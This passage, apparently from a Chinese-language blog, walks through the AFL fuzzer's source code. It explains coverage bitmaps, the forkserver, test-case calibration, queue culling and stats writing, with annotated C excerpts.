function_">classify_counts</span><span class="params">(u64 *mem)</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">  u32 i = MAP_SIZE &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i--)</span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optimize for sparse bitmaps. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(*mem))</span><br><span class="line">    {</span><br><span class="line"></span><br><span class="line">      u16 *mem16 = (u16 *)mem;</span><br><span class="line"></span><br><span class="line">      mem16[<span class="number">0</span>] = count_class_lookup16[mem16[<span class="number">0</span>]];</span><br><span class="line">      mem16[<span class="number">1</span>] = count_class_lookup16[mem16[<span class="number">1</span>]];</span><br><span class="line">      mem16[<span class="number">2</span>] = count_class_lookup16[mem16[<span class="number">2</span>]];</span><br><span class="line">      mem16[<span class="number">3</span>] = count_class_lookup16[mem16[<span class="number">3</span>]];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    mem++;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">classify_counts</span><span class="params">(u32 *mem)</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">  u32 i = MAP_SIZE &gt;&gt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i--)</span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optimize for sparse bitmaps. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(*mem))</span><br><span class="line">    {</span><br><span class="line"></span><br><span class="line">      u16 *mem16 = (u16 *)mem;</span><br><span class="line"></span><br><span class="line">      mem16[<span class="number">0</span>] = count_class_lookup16[mem16[<span class="number">0</span>]];</span><br><span class="line">      mem16[<span class="number">1</span>] = count_class_lookup16[mem16[<span class="number">1</span>]];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    mem++;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br></pre></td></tr></tbody></table></figure><h3 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h3><p>准备output文件夹及其子目录,和文件描述符.</p><h3 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h3><p>从输入目录中读取所有的测试样例,加入队列用于后续测试.<br>如果存在in_dir/queue目录,将in_dir设置为该目录.扫描其并根据文件名进行排序.若设置了shuffle_queue将文件名序列打乱(shuffle).去掉不合法的文件及已经加入到deterministic_done目录的文件(resume)后调用add_to_queue将合法文件加入到队列中.</p><p>设置queued_at_start=queued_paths.(queue中元素个数)</p><h3 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto"></a>load_auto</h3><p>加载自动生成的词典.</p><h3 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h3><p>在output目录中为输入测试样例创建硬链接(或拷贝).</p><h3 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h3><p>如果没有用-t指定超时时间且正在恢复会话,则尝试从fuzzer_stats中读取exec_timeout作为超时时间.</p><h3 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h3><p>如果参数中有@@ 且没有指定outfile,则将outfile设置为out_dir/.cur_input</p><h3 id="setup-stdio-file"><a href="#setup-stdio-file" class="headerlink" title="setup_stdio_file"></a>setup_stdio_file</h3><p>删除out_dir/.cur_input再重新创建,保存文件描述符到out_fd.</p><h3 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary"></a>check_binary</h3><p>检查要fuzz的二进制程序是否存在且不是shell脚本,同时检查ELF头是否合法以及AFL的插桩证据.并通过程序中的插桩信息配置一些模式,如uses_asan.</p><h3 id="获取当前时间作为启动时间"><a href="#获取当前时间作为启动时间" class="headerlink" title="获取当前时间作为启动时间"></a>获取当前时间作为启动时间</h3><h3 id="设置fuzz对象的参数"><a href="#设置fuzz对象的参数" class="headerlink" title="设置fuzz对象的参数"></a>设置fuzz对象的参数</h3><p>从argv中获取传给fuzz对象的参数,若为qemu_mode将重构参数.</p><h3 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h3><p>遍历初始输入的测试样例进行校准,确保应用程序预期工作.</p><h4 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h4><p>校准一个测试样例</p><h5 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver"></a>init_forkserver</h5><p>其中会首先调用init_forkserver启动forkserver.</p><h6 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h6><p>关于forkserver的想法及样例代码在<a href="https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html%E4%B8%AD%E8%A7%A3%E9%87%8A">https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html中解释</a>.<br>总结一下:<br>在传统的fuzzer中,fuuzzer自身不断fork+execve到fuzz目标程序(target),target再读取输入并处理,而Fuzzer通过waitpid获取处理结果.这种情况下,Fuzzer会花费大量时间waitpid来等待进程结束,等待链接器和所有的库初始化例程完成工作.</p><p>作者提出的解决方案有:</p><ol><li>通过自定义ELF加载器在Fuzzer内部执行target程序,通过mprotect保护Fuzzer本身的内存空间.</li><li>在单个子进程中执行并保存快照,稍后通过/proc/pid/mem恢复到快照.<br>但这两个方案都需要处理复杂的信号以及文件描述符.</li></ol><p>AFL采用的方法是将一段代码插入到target中,在其在加载并完成库的初始化后执行,该段代码诗其停在某个指定处(main),等待fuzzer的信号,接收到信号后fork出子进程,子进程作为target进行处理.而父进程即为forkserver,接收fuzzer的命令并将子进程执行结果发送给fuzzer.由于Copy-On-Write的机制,这将十分高效.</p><h6 id="forkserver"><a href="#forkserver" class="headerlink" title="forkserver"></a>forkserver</h6><p>当然,从Fuzzer创建forkserver的过程还是要经过一次fork+execve的过程.forkserver创建后,其的标准输出及标准错误均被dup到/dev/null.若此前设置了out_file,将标准输入dup到/dev/null,否则dup到out_fd.关闭Fuzzer自身的文件描述符.<br>设置ASAN和MSAN的环境变量,若没有指定LD_BIND_LAZY,设置LD_BIND_NOW=1,提前完成所有的加载绑定工作.<br>最后通过execv加载插桩后的target程序,其将会成为真正的forkserver.</p><h6 id="Fuzzer"><a href="#Fuzzer" class="headerlink" title="Fuzzer"></a>Fuzzer</h6><p>关闭不再需要的文件描述符.从status管道中读取4个字节,如果成功说明forkserver开始工作.否则进行错误处理.</p><h5 id="保存并更新位图"><a href="#保存并更新位图" class="headerlink" title="保存并更新位图"></a>保存并更新位图</h5><ul><li>如果该测试样例不是第一次校准<ul><li>将当前trace_bits拷贝到first_trace.</li><li>调用has_new_bits更新virgin_bits,hnb及new_bits</li></ul></li></ul><h6 id="has-new-bits-virgin-bits"><a href="#has-new-bits-virgin-bits" class="headerlink" title="has_new_bits(virgin_bits)"></a>has_new_bits(virgin_bits)</h6><p>笔者认为分析该函数的实现有利于理解trace_bits及之前提到的所谓”将元组(边)实际命中次数映射到某个桶中”.<br>该函数的目的是检测trace_bits中有新的bit被置位(新的bit被置位有两种情况,一是有新的路径(元组)产生,二是某元组的命中次数进入到下一个桶中),并更新virgin_bits位图.<br>由于该函数会频繁调用,所以需要提高其的运行效率.<br>详见下方注释.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if the current execution path brings anything new to the table.</span></span><br><span class="line"><span class="comment">   Update virgin bits to reflect the finds. Returns 1 if the only change is</span></span><br><span class="line"><span class="comment">   the hit-count for a particular tuple; 2 if there are new tuples seen. </span></span><br><span class="line"><span class="comment">   Updates the map, so subsequent calls will always return 0.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This function is called after every exec() on a fairly large buffer, so</span></span><br><span class="line"><span class="comment">   it needs to be fast. We do this in 32-bit and 64-bit flavors. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> u8 <span class="title function_">has_new_bits</span><span class="params">(u8 *virgin_map)</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line"></span><br><span class="line">  u64 *current = (u64 *)trace_bits;</span><br><span class="line">  u64 *virgin = (u64 *)virgin_map;</span><br><span class="line"></span><br><span class="line">  u32 i = (MAP_SIZE &gt;&gt; <span class="number">3</span>); <span class="comment">//以8字节(WORD_SIZE)为一个大的检测单位.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  u32 *current = (u32 *)trace_bits;</span><br><span class="line">  u32 *virgin = (u32 *)virgin_map;</span><br><span class="line"></span><br><span class="line">  u32 i = (MAP_SIZE &gt;&gt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line"></span><br><span class="line">  u8 ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i--) <span class="comment">//以WORD_SIZE遍历整个位图</span></span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optimize for (*current &amp; *virgin) == 0 - i.e., no bits in current bitmap</span></span><br><span class="line"><span class="comment">       that have not been already cleared from the virgin map - since this will</span></span><br><span class="line"><span class="comment">       almost always be the case. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(*current) &amp;&amp; unlikely(*current &amp; *virgin))</span><br><span class="line">        <span class="comment">/* (*current &amp; *virgin) == 0的优化版本</span></span><br><span class="line"><span class="comment">        检测该字长的trace_bits中是否有virgin_bits中仍置1的比特位.</span></span><br><span class="line"><span class="comment">        可以把virgin_bits理解为用来check trace_bits的掩码.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    {</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (likely(ret &lt; <span class="number">2</span>))</span><br><span class="line">      {</span><br><span class="line"></span><br><span class="line">        u8 *cur = (u8 *)current;</span><br><span class="line">        u8 *vir = (u8 *)virgin;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Looks like we have not found any new bytes yet; see if any non-zero</span></span><br><span class="line"><span class="comment">           bytes in current[] are pristine in virgin[]. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">4</span>] &amp;&amp; vir[<span class="number">4</span>] == <span class="number">0xff</span>) || (cur[<span class="number">5</span>] &amp;&amp; vir[<span class="number">5</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">6</span>] &amp;&amp; vir[<span class="number">6</span>] == <span class="number">0xff</span>) || (cur[<span class="number">7</span>] &amp;&amp; vir[<span class="number">7</span>] == <span class="number">0xff</span>))</span><br><span class="line">        <span class="comment">/* 注意一下运算符优先级.依次检查单个字节中 </span></span><br><span class="line"><span class="comment">        1.trace_bits是否至少有一个比特位置位(当前该路径是否被发现)</span></span><br><span class="line"><span class="comment">        2.virgin_bits是否每个比特仍置位(该路径之前未被发现)</span></span><br><span class="line"><span class="comment">        满足上述两个条件则说明有新的路径被发现,返回2</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">          ret = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="comment">//否则说明是该WORDSIZE代表的路径中,命中次数进入了下一个桶.</span></span><br><span class="line">          ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>))</span><br><span class="line">          ret = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      *virgin &amp;= ~*current; <span class="comment">//更新该WORDSIZE的virgin_bits</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    current++;</span><br><span class="line">    virgin++;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret &amp;&amp; virgin_map == virgin_bits)</span><br><span class="line">    bitmap_changed = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="进入校准阶段-calibration-stage"><a href="#进入校准阶段-calibration-stage" class="headerlink" title="进入校准阶段(calibration stage)"></a>进入校准阶段(calibration stage)</h5><p>循环运行stage_max = fast_cal ? 3 : CAL_CYCLES(8)次</p><h6 id="write-to-testcase"><a href="#write-to-testcase" class="headerlink" title="write_to_testcase"></a>write_to_testcase</h6><p>将本次queue_entry对应的样例内容写入out_file</p><h6 id="run-target"><a href="#run-target" class="headerlink" title="run_target"></a>run_target</h6><p>执行target程序并监控.若dumb_mode=1或no_forkserver=1,使用传统的fork-exec方案进行测试.否则向forkserver发送命令并读取forkserver传回的target’s pid.等待target执行完成读取forkserver传回的status.<br>计算本次的执行时间.<br>对本次产生的新trace_bits进行classify_counts(上文中分析过).<br>返回本次测试的结果保存到fault.</p><h6 id="初步分析执行结果"><a href="#初步分析执行结果" class="headerlink" title="初步分析执行结果"></a>初步分析执行结果</h6><ul><li>如果fault!=crash_mode(crash_mode默认是FAULT_NONE,指定-C后是FAULT_CRASH),跳转到abort_calibration标签.</li><li>如果不是dumb_mode且是该测试样例是第一次运行且运行后共享内存没有任何字节被置位(!count_bytes(trace_bits)),更新fault为FAULT_NOINST后跳转到abort_calibration.</li><li>计算hash32(trace_bits, MAP_SIZE, HASH_CONST)的结果保存到cksum中,若该测试样例是第一次运行或与上次cksum不同(路径可变的queue),<ul><li>调用has_new_bits分析执行结果,更新virgin_bits,hnb及new_bits</li><li>如果是路径可变的queue,遍历整个位图,if (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i])<ul><li>设置var_byte[i] = 1,更新循环次数stage_max=CAL_CYCLES_LONG(40).这将使得该样例被持续测试直到不再使trace_bits产生<code>未出现过</code>的变化.</li><li>设置var_detected=1(路径可变的queue)</li></ul></li><li>否则意味着是第一次运行,保存本次cksum到q-&gt;exec_cksum,复制trace_bits到first_trace.</li></ul></li></ul><h5 id="评估校准表现"><a href="#评估校准表现" class="headerlink" title="评估校准表现"></a>评估校准表现</h5><p>计算该样例在整个校准阶段的用时和循环次数.<br>保存一些统计信息到该queue_entry中.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">stop_us = get_cur_time_us();</span><br><span class="line"></span><br><span class="line">total_cal_us += stop_us - start_us;</span><br><span class="line">total_cal_cycles += stage_max;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* OK, let's collect some stats about the performance of this test case.</span></span><br><span class="line"><span class="comment">   This is used for fuzzing air time calculations in calculate_score(). */</span></span><br><span class="line"></span><br><span class="line">q-&gt;exec_us = (stop_us - start_us) / stage_max;</span><br><span class="line">q-&gt;bitmap_size = count_bytes(trace_bits);</span><br><span class="line">q-&gt;handicap = handicap;</span><br><span class="line">q-&gt;cal_failed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">total_bitmap_size += q-&gt;bitmap_size;</span><br><span class="line">total_bitmap_entries++;</span><br></pre></td></tr></tbody></table></figure><h6 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h6><p>检查是否出现了更”favorable”的路径.这是为了拥有一个最小的路径集来触发目前位图中出现的所有位,然后专注于fuzz这个集合.</p><p>判断是否更favorable的fav_factor是由q-&gt;exec_us(校准时间)*q-&gt;len(样例长度)得到的.</p><ul><li>遍历trace_bits中存在的每一条路径,<ul><li>如果有更小的fav_factor<ul><li>减少以前该路径对应的评分最高queue_entry的引用.设置当前queue_entry为评分最高,并引用+1.如果该queue_entry还没有创建trace_mini,分配一个并调用minimize_bits将当前trace_bits压缩存入.压缩将丢失路径的计数信息,即一条路径从一个字节(8位)压缩到1位空间.设置score_changed = 1</li></ul></li></ul></li></ul><h5 id="如果该样例是第一次校准且结果是FAULT-NONE且-new-bits"><a href="#如果该样例是第一次校准且结果是FAULT-NONE且-new-bits" class="headerlink" title="如果该样例是第一次校准且结果是FAULT_NONE且!new_bits"></a>如果该样例是第一次校准且结果是FAULT_NONE且!new_bits</h5><p>设置fault = FAULT_NOBITS</p><h5 id="abort-calibration"><a href="#abort-calibration" class="headerlink" title="abort_calibration"></a>abort_calibration</h5><ul><li>如果校准产生了新的路径且!q-&gt;has_new_cov,设置q-&gt;has_new_cov = 1并将queued_with_cov++.</li><li>如果是可变路径的样例,计算本次校准中产生变化的路径数<ul><li>该样例对应var_behavior未置1<ul><li>var_behavior置1,创建符号链接out_dir/queue/.state/variable_behavior/fname,queued_variable++.</li></ul></li></ul></li><li>恢复到校准前的stage.(stage_name,stage_cur,stage_max)</li><li>如果该样例不是第一次校准<ul><li>show_stats</li></ul></li><li>返回fault.</li></ul><h4 id="处理本次校准结果"><a href="#处理本次校准结果" class="headerlink" title="处理本次校准结果"></a>处理本次校准结果</h4><ul><li>FAULT_NONE:<ul><li>如果当前是第一个样例，则check_map_coverage，用以评估map coverage<ul><li>若trace_bits中发现的路径小于100，就直接返回</li><li>trace_bits的数组后半段，如果有值就直接返回。</li><li>否则出警告WARNF(“Recompile binary with newer version of afl to improve coverage!”)</li></ul></li><li>如果是crash_mode,抛出异常FATAL(“Test case ‘%s’ does NOT crash”, fn).</li></ul></li><li>FAULT_TMOUT:<ul><li>若指定了-t nn+,则设置q-&gt;cal_failed = CAL_CHANCES,cal_failures++(容忍超时并跳过该样例),否则抛出异常.</li></ul></li><li>FAULT_CRASH:<ul><li>除了崩溃探索(-C)以外,直接造成Crash的初始输入是不合规的.</li><li>如果指定了-C或AFL_SKIP_CRASHES,跳过该样例.后者还会设置q-&gt;cal_failed = CAL_CHANCES,cal_failures++</li><li>否则抛出异常.</li></ul></li><li>FAULT_ERROR:<ul><li>FATAL(“Unable to execute target application (‘%s’)”, argv[0]);</li></ul></li><li>FAULT_NOINST:<ul><li>FATAL(“No instrumentation detected”);</li></ul></li><li>FAULT_NOBITS:<ul><li>useless_at_start++.</li><li>如果没有-B指定初始in_bitmap且没有设置AFL_SHUFFLE_QUEUE<ul><li>WARNF(“No new instrumentation output, test case may be useless.”);</li></ul></li></ul></li></ul><h4 id="计算所有初始输入样例的校准结果"><a href="#计算所有初始输入样例的校准结果" class="headerlink" title="计算所有初始输入样例的校准结果"></a>计算所有初始输入样例的校准结果</h4><p>如果cal_failures == queued_paths抛出异常,cal_failures * 5 &gt; queued_paths抛出警告</p><h3 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h3><p>精简队列,挑选出fav_factor高且能覆盖所有已发现路径的测试样例.<br>采用的是贪心算法,依次遍历到的每条路径都选最好的测试样例,有些路径在此前遍历中挑选出的测试样例已经能产生了,则不再遍历.</p><ul><li>如果是dumb_mode或没有评分改变(!score_changed)则直接返回</li><li>设置score_changed = 0;queued_favored = 0;pending_favored = 0;初始化一个temp_v数组,作用和virgin_bits相似,不过每条路径只占一比特(去除计数信息).</li><li>遍历所有测试样例,设置q-&gt;favored=0</li><li>遍历top_rated的每个字节(每条路径已发现的评分最高样例),若该路径在temp_v中仍置位<ul><li>在temp_v中去掉该样例的trace_mini中的路径.</li><li>设置该样例的favored=1,queued_favored++.</li><li>如果该样例还没有进行过fuzz<ul><li>pending_favored++</li></ul></li></ul></li><li>遍历所有测试样例,设置q-&gt;fs_redundant=!favored,根据是否冗余创建或删除out_dir/queue/.state/redundant_edges/fname.</li></ul><h3 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats"></a>show_init_stats</h3><p>在处理输入目录的末尾显示统计信息，以及一堆警告,以及几个硬编码的常量</p><h3 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position"></a>find_start_position</h3><p>如果是resuming_fuzz,则尝试恢复要开始的队列位置保存到seek_to.这仅在resume时以及当我们可以找到原始的fuzzer_stats时才有意义.</p><ul><li>if(in_place_resume)<ul><li>从out_dir/fuzzer_stats恢复</li></ul></li><li>否则从in_dir/../fuzzer_stats中恢复</li><li>读取文件内容寻找cur_path,若未找到或cur_path大于当前队列长度,返回0,否则返回cur_path.</li></ul><h3 id="write-stats-file"><a href="#write-stats-file" class="headerlink" title="write_stats_file"></a>write_stats_file</h3><p>更新统计信息文件outdir/fuzzer_stats</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"start_time        : %llu\n"</span></span><br><span class="line">           <span class="string">"last_update       : %llu\n"</span></span><br><span class="line">           <span class="string">"fuzzer_pid        : %u\n"</span></span><br><span class="line">           <span class="string">"cycles_done       : %llu\n"</span></span><br><span class="line">           <span class="string">"execs_done        : %llu\n"</span></span><br><span class="line">           <span class="string">"execs_per_sec     : %0.02f\n"</span></span><br><span class="line">           <span class="string">"paths_total       : %u\n"</span></span><br><span class="line">           <span class="string">"paths_favored     : %u\n"</span></span><br><span class="line">           <span class="string">"paths_found       : %u\n"</span></span><br><span class="line">           <span class="string">"paths_imported    : %u\n"</span></span><br><span class="line">           <span class="string">"max_depth         : %u\n"</span></span><br><span class="line">           <span class="string">"cur_path          : %u\n"</span> <span class="comment">/* Must match find_start_position() */</span></span><br><span class="line">           <span class="string">"pending_favs      : %u\n"</span></span><br><span class="line">           <span class="string">"pending_total     : %u\n"</span></span><br><span class="line">           <span class="string">"variable_paths    : %u\n"</span></span><br><span class="line">           <span class="string">"stability         : %0.02f%%\n"</span></span><br><span class="line">           <span class="string">"bitmap_cvg        : %0.02f%%\n"</span></span><br><span class="line">           <span class="string">"unique_crashes    : %llu\n"</span></span><br><span class="line">           <span class="string">"unique_hangs      : %llu\n"</span></span><br><span class="line">           <span class="string">"last_path         : %llu\n"</span></span><br><span class="line">           <span class="string">"last_crash        : %llu\n"</span></span><br><span class="line">           <span class="string">"last_hang         : %llu\n"</span></span><br><span class="line">           <span class="string">"execs_since_crash : %llu\n"</span></span><br><span class="line">           <span class="string">"exec_timeout      : %u\n"</span> <span class="comment">/* Must match find_timeout() */</span></span><br><span class="line">           <span class="string">"afl_banner        : %s\n"</span></span><br><span class="line">           <span class="string">"afl_version       : "</span> VERSION <span class="string">"\n"</span></span><br><span class="line">           <span class="string">"target_mode       : %s%s%s%s%s%s%s\n"</span></span><br><span class="line">           <span class="string">"command_line      : %s\n"</span></span><br><span class="line">           <span class="string">"slowest_exec_ms   : %llu\n"</span>,</span><br><span class="line">        start_time / <span class="number">1000</span>, get_cur_time() / <span class="number">1000</span>, getpid(),</span><br><span class="line">        queue_cycle ? (queue_cycle - <span class="number">1</span>) : <span class="number">0</span>, total_execs, eps,</span><br><span class="line">        queued_paths, queued_favored, queued_discovered, queued_imported,</span><br><span class="line">        max_depth, current_entry, pending_favored, pending_not_fuzzed,</span><br><span class="line">        queued_variable, stability, bitmap_cvg, unique_crashes,</span><br><span class="line">        unique_hangs, last_path_time / <span class="number">1000</span>, last_crash_time / <span class="number">1000</span>,</span><br><span class="line">        last_hang_time / <span class="number">1000</span>, total_execs - last_crash_execs,</span><br><span class="line">        exec_tmout, use_banner,</span><br><span class="line">        qemu_mode ? <span class="string">"qemu "</span> : <span class="string">""</span>, dumb_mode ? <span class="string">" dumb "</span> : <span class="string">""</span>,</span><br><span class="line">        no_forkserver ? <span class="string">"no_forksrv "</span> : <span class="string">""</span>, crash_mode ? <span class="string">"crash "</span> : <span class="string">""</span>,</span><br><span class="line">        persistent_mode ? <span class="string">"persistent "</span> : <span class="string">""</span>, deferred_mode ? <span class="string">"deferred "</span> : <span class="string">""</span>,</span><br><span class="line">        (qemu_mode || dumb_mode || no_forkserver || crash_mode ||</span><br><span class="line">         persistent_mode || deferred_mode) ? <span class="string">""</span> : <span class="string">"default"</span>,</span><br><span class="line">        orig_cmdline, slowest_exec_ms);</span><br></pre></td></tr></tbody></table></figure><h3 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto"></a>save_auto</h3><p>保存自动生成的extras</p><h2 id="Fuzz执行"><a href="#Fuzz执行" class="headerlink" title="Fuzz执行"></a>Fuzz执行</h2><h3 id="Fuzz主循环"><a href="#Fuzz主循环" class="headerlink" title="Fuzz主循环"></a>Fuzz主循环</h3><h4 id="cull-queue-1"><a href="#cull-queue-1" class="headerlink" title="cull_queue"></a>cull_queue</h4><h4 id="如果第一次循环或是一轮循环结束-进行新一轮fuzz的初始化"><a href="#如果第一次循环或是一轮循环结束-进行新一轮fuzz的初始化" class="headerlink" title="如果第一次循环或是一轮循环结束,进行新一轮fuzz的初始化"></a>如果第一次循环或是一轮循环结束,进行新一轮fuzz的初始化</h4><p>详见注释</p><figure class="highlight 